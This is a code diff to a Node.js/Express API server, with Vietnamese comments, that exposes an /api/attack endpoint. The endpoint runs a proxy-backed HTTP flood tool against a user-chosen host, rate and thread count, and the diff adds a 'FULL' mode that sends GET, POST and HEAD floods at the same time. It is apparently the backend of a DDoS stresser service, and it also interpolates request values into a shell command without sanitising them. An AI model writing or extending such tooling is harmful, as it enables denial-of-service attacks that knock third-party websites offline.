@@ -29,8 +29,18 @@ app.get("/api/attack", (req, res) => {
     return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
 
   activeAttacks++;
-  const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-  executeAttack(command, res, host, port, time, method);
+  
+  // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
+  if (modul === "FULL") {
+    const methods = ["GET", "POST", "HEAD"];
+    methods.forEach((method) => {
+      const command = `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
+      executeAttack(command, res, host, port, time, method);
+    });
+  } else {
+    const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
+    executeAttack(command, res, host, port, time, method);
+  }
 });
 
 app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
